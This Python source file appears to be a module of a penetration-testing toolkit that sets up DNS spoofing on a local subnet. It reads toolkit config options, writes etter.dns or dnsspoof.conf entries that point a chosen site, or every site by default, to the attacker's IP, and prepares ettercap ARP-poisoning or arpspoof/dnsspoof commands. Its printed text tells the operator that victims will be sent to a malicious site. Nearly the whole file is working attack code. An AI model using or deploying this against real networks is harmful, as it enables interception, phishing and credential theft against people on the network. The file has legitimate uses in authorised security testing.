import subprocess
import re
import pexpect
import os
import time
import sys
from src.core.setcore import *

# Define to use ettercap or dsniff or nothing.
#
# Thanks to sami8007 and trcx for the dsniff addition

definepath = os.getcwd()

# grab config file
config = open("/etc/setoolkit/set.config", "r").readlines()
# grab our default directory
cwd = os.getcwd()
# set a variable as default to n or no
ettercapchoice = 'n'
# add dsniffchoice
dsniffchoice = 'n'
for line in config:
    if match1 := re.search("ETTERCAP=ON", line):
        print_info(f"ARP Cache Poisoning is set to {bcolors.GREEN}ON{bcolors.ENDC}")
        ettercapchoice = 'y'

    if match2 := re.search("DSNIFF=ON", line):
        print_info(f"DSNIFF DNS Poisoning is set to {bcolors.GREEN}ON{bcolors.ENDC}")
        dsniffchoice = 'y'
        ettercapchoice = 'n'

# GRAB CONFIG from SET
fileopen = open("/etc/setoolkit/set.config", "r").readlines()
for line in fileopen:
    if match := re.search("ETTERCAP_INTERFACE=", line):
        line = line.rstrip()
        interface = line.split("=")
        interface = interface[1]
        if interface == "NONE":
            interface = ""

    if etterpath := re.search("ETTERCAP_PATH=", line):
        line = line.rstrip()
        path = line.replace("ETTERCAP_PATH=", "")

        if not os.path.isfile(path):
            path = ("/usr/local/share/ettercap")

# if we are using ettercap then get everything ready
if ettercapchoice == 'y':

    # grab ipaddr
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(setprompt("0", "IP address to connect back on: "))
        update_options(f"IPADDR={ipaddr}")

    try:
        print("""
  This attack will poison all victims on your local subnet, and redirect them
  when they hit a specific website. The next prompt will ask you which site you
  will want to trigger the DNS redirect on. A simple example of this is if you
  wanted to trigger everyone on your subnet to connect to you when they go to
  browse to www.google.com, the victim would then be redirected to your malicious
  site. You can alternatively poison everyone and everysite by using the wildcard
  '*' flag.

  IF YOU WANT TO POISON ALL DNS ENTRIES (DEFAULT) JUST HIT ENTER OR *
""")
        print_info("Example: http://www.google.com")
        dns_spoof = raw_input(
            setprompt("0", "Site to redirect to attack machine [*]"))
        os.chdir(path)
        # small fix for default
        if dns_spoof == "":
            # set default to * (everything)
            dns_spoof = "*"
        # remove old stale files
        subprocess.Popen(
            "rm etter.dns 1> /dev/null 2> /dev/null", shell=True).wait()
        with open("etter.dns", "w") as filewrite:
            # send our information to etter.dns
            filewrite.write(f"{dns_spoof} A {ipaddr}")
        # set bridge variable to nothing
        bridge = ""
        # assign -M arp to arp variable
        arp = "-M arp"
        print_error("LAUNCHING ETTERCAP DNS_SPOOF ATTACK!")
        # spawn a child process
        os.chdir(cwd)
        time.sleep(5)
        with open(f"{userconfigpath}ettercap", "w") as filewrite:
            filewrite.write(
                f"ettercap -T -q -i {interface} -P dns_spoof {arp} {bridge} // //"
            )
        os.chdir(cwd)
    except Exception as error:
        os.chdir(cwd)
        # log(error)
        print_error("ERROR:An error has occured:")
        print(f"ERROR:{str(error)}")

# if we are using dsniff
if dsniffchoice == 'y':

    # grab ipaddr
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(setprompt("0", "IP address to connect back on: "))
        update_options(f"IPADDR={ipaddr}")

    try:
        print("""
  This attack will poison all victims on your local subnet, and redirect them
  when they hit a specific website. The next prompt will ask you which site you
  will want to trigger the DNS redirect on. A simple example of this is if you
  wanted to trigger everyone on your subnet to connect to you when they go to
  browse to www.google.com, the victim would then be redirected to your malicious
  site. You can alternatively poison everyone and everysite by using the wildcard
  '*' flag.

  IF YOU WANT TO POISON ALL DNS ENTRIES (DEFAULT) JUST HIT ENTER OR *
""")
        print_info("Example: http://www.google.com")
        dns_spoof = raw_input(
            setprompt("0", "Site to redirect to attack machine [*]"))
        # os.chdir(path)
        # small fix for default
        if dns_spoof == "":
            dns_spoof = "*"
        subprocess.Popen(
            f"rm {userconfigpath}/dnsspoof.conf 1> /dev/null 2> /dev/null",
            shell=True,
        ).wait()
        with open(f"{userconfigpath}dnsspoof.conf", "w") as filewrite:
            filewrite.write(f"{ipaddr} {dns_spoof}")
        print_error("LAUNCHING DNSSPOOF DNS_SPOOF ATTACK!")
        # spawn a child process
        os.chdir(cwd)
        # time.sleep(5)
        # grab default gateway, should eventually replace with pynetinfo
        # python module
        gateway = subprocess.Popen("netstat -rn|grep %s|awk '{print $2}'| awk 'NR==2'" % (
            interface), shell=True, stdout=subprocess.PIPE).communicate()[0]
        with open(f"{userconfigpath}ettercap", "w") as filewrite:
            # write the arpspoof / dnsspoof commands to file
            filewrite.write(
                f"arpspoof {gateway} | dnsspoof -f {userconfigpath}/dnsspoof.conf"
            )
        # change back to normal directory
        os.chdir(cwd)
        # this is needed to keep it similar to format above for web gui
        # mode
        pause = raw_input("Press <return> to begin dsniff.")
    except Exception as error:
        os.chdir(cwd)
        print_error("ERROR:An error has occurred:")
        print(f"{bcolors.RED}ERROR{str(error)}{bcolors.ENDC}")
